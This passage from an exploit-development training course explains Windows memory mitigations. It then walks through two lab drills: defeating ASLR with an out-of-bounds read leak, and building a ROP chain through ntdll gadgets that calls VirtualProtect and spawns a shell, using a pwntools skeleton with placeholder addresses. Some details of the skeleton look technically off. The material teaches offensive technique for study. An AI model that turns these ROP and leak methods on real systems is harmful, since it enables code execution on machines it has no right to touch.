  activity if the target process handles external input (like an
  antivirus engine scanning downloaded files).

---

## Key Terms (Add to Glossary)

| Term | Definition |
|------|-----------|
| **DEP / NX** | Data Execution Prevention — marks memory pages as non-executable; hardware enforced via NX/XD bit in page tables |
| **ASLR** | Address Space Layout Randomization — randomizes base addresses of images, heap, stack, PEB/TEB at load time |
| **High Entropy ASLR** | /HIGHENTROPYVA — enables full 19-bit randomization for 64-bit DLLs (vs 14-bit default) |
| **CFG** | Control Flow Guard — validates indirect call targets against a bitmap of valid function entry points |
| **CFG bitmap** | Per-process bitmap where each bit marks an 8-byte-aligned address as a valid/invalid indirect call target |
| **XFG** | eXtended Flow Guard — CFG with type-based hashing; call target must match the call site's function signature |
| **CET** | Control-flow Enforcement Technology — Intel/AMD hardware feature providing shadow stack + IBT |
| **Shadow stack** | Hardware-protected second stack storing only return addresses; `ret` validated against it |
| **IBT** | Indirect Branch Tracking — requires indirect jump/call targets to begin with ENDBRANCH instruction |
| **ACG** | Arbitrary Code Guard — process mitigation that forbids creating new executable memory from data |
| **ROP** | Return-Oriented Programming — chaining short instruction sequences (gadgets) ending in `ret` to bypass DEP |
| **Gadget** | Short instruction sequence in existing executable code ending in `ret`; building block of ROP chains |
| **Info leak** | Bug that reveals pointer values to the attacker; used to calculate DLL base addresses and defeat ASLR |
| **Stack cookie / /GS** | Compiler-inserted random canary value between local variables and return address; detects linear stack overflow |
| **SafeSEH** | Table of valid SEH handler addresses checked before exception dispatch; 32-bit only |
| **SEHOP** | SEH Overwrite Protection — validates SEH chain integrity by checking for sentinel at chain end |
| **LFH randomization** | Low Fragmentation Heap randomizes allocation order within size buckets to hinder heap grooming |
| **Safe unlinking** | Allocator validates doubly-linked list pointer consistency before unlink; blocks classic heap metadata attacks |
| **RWX** | Read-Write-Execute — memory permission triple that DEP/ACG prevent; the holy grail for shellcode injection |
| **rp++** | Windows ROP gadget finder — scans PE binaries and outputs every gadget sequence with its address |
| **ROPgadget** | Python-based ROP gadget scanner — alternative to rp++, scriptable, outputs gadgets for chaining |
| **CFF Explorer** | PE file header inspector — GUI tool for reading DLL characteristics including HIGHENTROPYVA and DYNAMICBASE flags |
| **ENDBRANCH / endbr64** | Intel CET instruction marking a valid indirect branch target; indirect jumps/calls that don't land on it trigger a #CP exception |

---

## Drill 03 — Information Leak

Go to `DRILLS/03_info_leak/`. A vulnerable program has an out-of-bounds
read bug. Your mission: leak a DLL base address, calculate the offset
to `system()`, and print the base address to prove ASLR is defeated.

ASLR is ON. DEP is ON. You can't brute-force. Find the leak. Read
the pointer. Do the math.

### Compile Instructions (Drill 03)

```powershell
# Navigate to the drill directory
cd C:\path\to\DRILLS\03_info_leak

# Compile with mingw-gcc — disable stack cookies to isolate the info-leak primitive
# /DYNAMICBASE is ON by default with mingw, so ASLR will be active
gcc -o vuln.exe vuln.c -fno-stack-protector

# Run the target
.\vuln.exe

# Run the exploit script against it (Python + pwntools)
python exploit.py
```

#### Expected Output (Drill 03)

**Success:**
```
[*] Triggering out-of-bounds read...
[+] Leaked pointer: 0x00007ffabc123456
[+] Calculated ntdll base: 0x00007ffabc000000
[+] system() address: 0x00007ffabc0a1234
[*] ASLR defeated. Addresses calculated.
```

**Failure looks like "Leaked pointer: 0x0000000000000000"** — the OOB
read hit a null page or the offset is wrong. Adjust the read offset in
the exploit script — you're not hitting the pointer you think you are.

**Failure looks like "Connection refused" or process crashes immediately** —
the vulnerable program crashed before sending data back. Check that
the program is actually running and listening before launching the
exploit script.

---

## Drill 04 — ROP Chain

Go to `DRILLS/04_rop_chain/`. A vulnerable program has a stack
overflow with DEP enabled. Stack cookies are OFF (we're isolating
DEP for this exercise). Your mission: build a ROP chain that calls
`VirtualProtect` to mark your shellcode page as executable, then
redirect execution to it.

You have the DLL base (no ASLR for this drill — we combine mitigations
in later drills). Find gadgets with `rp++` or `ROPgadget`. Chain them.
Pop the shell.

### Compile Instructions (Drill 04)

```powershell
# Navigate to the drill directory
cd C:\path\to\DRILLS\04_rop_chain

# Compile with MSVC (Developer Command Prompt) — DEP is on by default,
# disable stack cookies to isolate the ROP exercise
cl.exe /GS- /link /NXCOMPAT /OUT:vuln.exe vuln.c

# OR with mingw-gcc:
gcc -o vuln.exe vuln.c -fno-stack-protector -Wl,--nxcompat

# Confirm DEP is on for the compiled binary
dumpbin /headers vuln.exe | findstr "NX compatible"
# Expected: NX compatible
```

### Finding Gadgets With rp++

rp++ scans a PE binary (or a loaded DLL) and prints every usable
gadget — the instruction sequence plus the address where it lives.

```powershell
# Scan a DLL for gadgets — output to a text file for easy searching
rp.exe --file C:\Windows\System32\ntdll.dll --rop 5 > ntdll_gadgets.txt
#       ^^^^ binary to scan                  ^^^ max gadget length in instructions

# Search the output for a specific gadget type
# (use findstr on Windows or grep in Git Bash)
findstr /C:"pop rdi ; ret" ntdll_gadgets.txt
# Expected: lines like:
# 0x00007ffa12345678: pop rdi ; ret  (1 found)
```

#### Expected Output (rp++ scan)

**Success:**
```
Wait a few seconds, rp++ is working !
Done.
A total of 14823 gadgets found.
You want to see them ? Let's rock !

0x00007ffa12340001: add al, 0x24 ; ret  ;  (1 found)
0x00007ffa12340012: add byte [rax], al ; ret  ;  (1 found)
...
```

**Failure looks like "The system cannot find the file specified"** —
the DLL path is wrong. Check the path exists with `dir` first, then
re-run rp++ with the corrected path.

**Failure looks like "rp is not recognized"** — rp.exe is not on your
PATH. Either add its folder to PATH or use the full path:
`C:\tools\rp.exe --file ...`

### Finding Gadgets With ROPgadget

ROPgadget is the Python alternative — slower than rp++ but easier
to script and filter:

```powershell
# Scan a DLL for all gadgets
ROPgadget --binary C:\Windows\System32\ntdll.dll > ntdll_gadgets.txt

# Search for a specific gadget inline (no output file needed)
ROPgadget --binary C:\Windows\System32\ntdll.dll --rop --re "pop rdi"
# Expected: table of matching gadgets with addresses

# Find a ret gadget (needed as chain terminator)
ROPgadget --binary C:\Windows\System32\ntdll.dll --ret
```

#### Expected Output (ROPgadget)

**Success:**
```
Gadgets information
============================================================
0x00007ffa12340078 : pop rdi ; ret
0x00007ffa12340102 : pop rsi ; ret
0x00007ffa12340201 : pop rcx ; ret
...

Unique gadgets found: 9823
```

**Failure looks like "ROPgadget is not recognized"** — not installed.
Run `pip install ROPgadget` and retry.

**Failure looks like "No gadget found"** — the regex is too strict.
Try a shorter pattern. `--re "pop rdi"` should match if the gadget
exists; `--re "pop rdi ; ret"` requires the exact sequence.

### Building The ROP Chain (Drill 04)

```python
# exploit.py — skeleton for Drill 04 ROP chain
# Fill in the gadget addresses from your rp++/ROPgadget output

from pwn import *                   # pwntools for payload construction

# Connect to the vulnerable process (adjust as needed)
p = process("./vuln.exe")

# --- Addresses (no ASLR for this drill — static addresses) ---
ntdll_base     = 0x00007ffa12340000  # confirmed from rp++ scan
pop_rcx        = ntdll_base + 0x1234 # "pop rcx ; ret" — load 1st arg
pop_rdx        = ntdll_base + 0x5678 # "pop rdx ; ret" — load 2nd arg
pop_r8         = ntdll_base + 0x9abc # "pop r8  ; ret" — load 3rd arg
pop_r9         = ntdll_base + 0xdef0 # "pop r9  ; ret" — load 4th arg
virtual_protect = 0x00007ffa99001234 # VirtualProtect — valid CFG target

shellcode_addr  = 0x00401000         # where your shellcode lives (pre-staged)
shellcode_size  = 0x1000             # size to mark executable

# --- Build the ROP chain ---
# Windows x64 calling convention: args go in RCX, RDX, R8, R9
rop = b""
rop += p64(pop_rcx)        # gadget: pop rcx ; ret
rop += p64(shellcode_addr) # arg1 (lpAddress): page to make executable
rop += p64(pop_rdx)        # gadget: pop rdx ; ret
rop += p64(shellcode_size) # arg2 (dwSize): size of region
rop += p64(pop_r8)         # gadget: pop r8 ; ret
rop += p64(0x40)           # arg3 (flNewProtect): PAGE_EXECUTE_READWRITE
rop += p64(pop_r9)         # gadget: pop r9 ; ret
rop += p64(shellcode_addr) # arg4 (lpflOldProtect): where to write old perms
rop += p64(virtual_protect)# call VirtualProtect — CFG-valid target
rop += p64(shellcode_addr) # after VirtualProtect returns, execute shellcode

# --- Craft the full overflow payload ---
padding = b"A" * 72        # fill buffer up to return address (find offset first)
payload = padding + rop    # overwrite return address with first ROP gadget

p.send(payload)            # send to vulnerable process
p.interactive()            # drop to interactive shell if it worked
```

#### Expected Output (Drill 04)

**Success:**
```
[+] Starting local process './vuln.exe': pid 1234
[*] Switching to interactive mode
$ whoami
desktop-abc\george
$
```

**Failure looks like "Segmentation fault" or "Access violation" immediately** —
your padding offset is wrong. The return address overwrite isn't landing
on the first ROP gadget. Use a cyclic pattern to find the exact offset:
`cyclic(200)` from pwntools, send it, check the crash address in WinDbg.

**Failure looks like the process crashes at a gadget address** — the
gadget address is wrong. Double-check your rp++/ROPgadget output and
make sure you're adding the correct offset to the correct base address.

**Failure looks like "STATUS_ACCESS_VIOLATION at VirtualProtect"** —
ACG might be on for this binary (unlikely for the drill, but verify
with `Get-ProcessMitigation`). Alternatively, the arguments to
VirtualProtect are wrong — check that lpflOldProtect points to
writable memory, not a random address.
